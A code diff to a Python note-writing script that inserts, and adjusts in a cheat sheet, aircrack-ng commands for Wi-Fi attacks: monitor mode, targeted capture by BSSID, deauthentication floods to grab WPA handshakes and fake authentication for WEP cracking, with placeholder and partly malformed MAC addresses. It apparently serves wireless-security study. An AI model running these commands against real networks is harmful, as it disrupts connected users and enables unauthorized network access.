@@ -51,7 +51,23 @@ file.write("Text Input")
 file.close()
 
 file = open(f"{sub_one_a}/Txt", "w") 
-file.write("Text Input")
+file.write("""
+
+sudo airmon-ng 
+
+sudo airmon-ng start wlan0
+
+sudo airodump-ng --band a wlan0mon -w main
+
+airodump-ng wlan0mon -c 11 --bssid E8:2C:6D:00:00 -w <network_name>
+
+aireplay-ng -0 15 -a 1C:9E:CC:00:00 -c 3C:2E:FF:00:00
+
+aireplay-ng -1 0 -e teddy -a 00:14:7K:6E:40:80 -h 00:0F:9K:68:9K:82 wlan0mon
+
+
+
+""")
 file.close()
 
 file = open(f"{main}/Txt", "w") 
@@ -103,11 +119,11 @@ Using the aircrack-ng suite, Turn on the monitor mode
 
 Simple passive listening and capture, Used to discover AP in the environment
 
-                                sudo airodump-ng wlan0mon
+                                sudo airodump-ng --band a wlan0mon -w main
 
 Targeted listening and capture, Focus on one AP and one channel
 
-                   airodump-ng wlan0mon -c 11 --bssid E8:2C:6D.... -w sonic
+                   airodump-ng wlan0mon -c 11 --bssid E8:2C:6D:00:00 -w sonic
 
 Attacking WEP
 
@@ -122,7 +138,7 @@ Deauth connected devices while airodump is running in a separate Terminal to ini
 
 In the airodump-ng Terminal, the WPA handshake will appear once captured
 
-                       aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon
+                       aireplay-ng -0 15 -a 1C:9E:CC:00:00 -c 3C:2E:FF:00:00 wlan0mon
 
 - 0 means deauthentitcation - - 15 is number of deauths sent
 
